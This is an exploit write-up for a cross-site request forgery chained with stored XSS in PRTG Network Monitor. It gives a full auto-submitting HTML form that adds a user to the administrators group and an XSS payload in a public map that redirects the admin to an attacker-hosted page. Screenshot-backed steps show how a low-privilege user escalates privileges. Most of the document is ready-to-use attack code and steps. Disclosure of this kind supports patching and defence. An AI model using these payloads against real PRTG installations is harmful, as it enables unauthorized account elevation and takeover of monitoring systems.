# PRTG Network Monitoor v20.1.55 to 21.2.68.1492 - CSRF
Cross Site Request Forgery (CSRF) on PRTG Network Monitor version 20.1.55 to 21.2.68.1492

Exploit Title: Cross Site Request Forgery (CSRF)  
Date: 10/06/2021  
Exploit Author: Likhith CV  
Vendor Homepage: https://www.paessler.com/  
Software Link: https://www.paessler.com/prtg  
Test on Version: 20.1.55.1775+ and 21.2.68.1492+    
Affected Versions: not tested on other versions  


## Observation
It was observed that anti csrf tokens are not implemented in PRTG Network Monitor v20.1.55 to 21.2.68.1492

Severity: High

## Steps To reproduce:

To exploit this vulnerability normal user can simply create a HTML form that would add a normal user account to administrators group request and share the link with the victim. On clicking the link , the user account elevation request will be triggered in background and it shall create a user account from his valid session. Since this version is vulnerable to Stored XSS attacker chain XSS to CSRF

Any action can be performed on behalf of logged in user but for demonstration user account privilege escalation is shown as example

### Chaining XSS to CSRF

1. Create a CSRF payload as following
```javascript
<html>
  <body>  
 <form action="https://[PRTG_domain]/editsettings" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="name&#95;" value="PRTG&#32;Administrators" />
      <input type="hidden" name="defaulthome&#95;" value="&#47;welcome&#46;htm" />
      <input type="hidden" name="isadgroup" value="0" />
      <input type="hidden" name="adusertype&#95;" value="0" />
      <input type="hidden" name="aduserack&#95;" value="0" />
      <input type="hidden" name="users&#95;" value="1" />
      <input type="hidden" name="users&#95;" value="1" />
      <input type="hidden" name="users&#95;&#95;check" value="[user_id]&#124;[username]&#124;" />			<!--user_id and username-->
      <input type="hidden" name="users&#95;&#95;check" value="100&#124;PRTG&#32;System&#32;Administrator&#124;" />
      <input type="hidden" name="id" value="200" />
      <input type="hidden" name="targeturl" value="&#47;systemsetup&#46;htm&#63;tabid&#61;6" />
      <input type="submit" value="Submit request" />
    </form>
    <svg/onload='document.forms[0].submit()'/> 
  </body>
</html>



```
2. deliver the payload to admin of the PRTG Portal
3. once Admin opens your payload, normal user's privilege will be elevated


Since this version is vulnerable to stored XSS, XSS can be leverged to CSRF and used to trick admin in creating new user
### before elevating Privileges
![0before](https://user-images.githubusercontent.com/36541248/122039108-5f9a0180-cde7-11eb-8366-4b539992926b.png)

### Get user id from source code
![user_id](https://user-images.githubusercontent.com/36541248/122039169-6e80b400-cde7-11eb-961d-ada94074f825.png)


### CSRF Payload
![image](https://user-images.githubusercontent.com/36541248/122034254-6114fb00-cde2-11eb-83ae-a0b3d0ef812e.png)

### Hosting admin_csrf.html on attacker server
![host_csrf_payload](https://user-images.githubusercontent.com/36541248/122034421-91f53000-cde2-11eb-8fd5-1444897e31f9.png)

### Add a Map
![2add_map1](https://user-images.githubusercontent.com/36541248/122038569-cc60cc00-cde6-11eb-9ebe-b439d73d3411.png)

### Enter any name and select allow publilc access (so that our XSS payload is publically accessible)
![3add_map2](https://user-images.githubusercontent.com/36541248/122038633-dc78ab80-cde6-11eb-850f-08ce1a50b800.png)


### Go to Map Designer --> Drag and Drop a Icon --> Enter XSS payload in After HTML

```javascript
<img src=x onerror=document.location.href="http://attacker.com/admin_csrf.html"//">

```

![4add_map3](https://user-images.githubusercontent.com/36541248/122038644-e0a4c900-cde6-11eb-8421-ee3a87497f71.png)

### Click on Save

### New Map with XSS payload is created
![map_created](https://user-images.githubusercontent.com/36541248/122039511-cf0ff100-cde7-11eb-9ea3-531412c40944.png)

### Once Admin Logs in, he is displayed with malicious map created by normal user
![all_maps_disaplayed_on_admin](https://user-images.githubusercontent.com/36541248/122038939-32e5ea00-cde7-11eb-955a-3733fe44f5b0.png)


### Once the Admin Opens map CSRF Payload is triggered and new user account "user_test2" is created
![5after](https://user-images.githubusercontent.com/36541248/122038971-3aa58e80-cde7-11eb-908a-78bdfa40b638.png)


### Tested on  20.1.55.1775+ and 21.2.68.1492+   

![uasi_version](https://user-images.githubusercontent.com/36541248/122043872-e6051200-cdec-11eb-812e-70b27e31319d.png)


![image](https://user-images.githubusercontent.com/36541248/122044072-22d10900-cded-11eb-90cd-35d72a25bd6e.png)

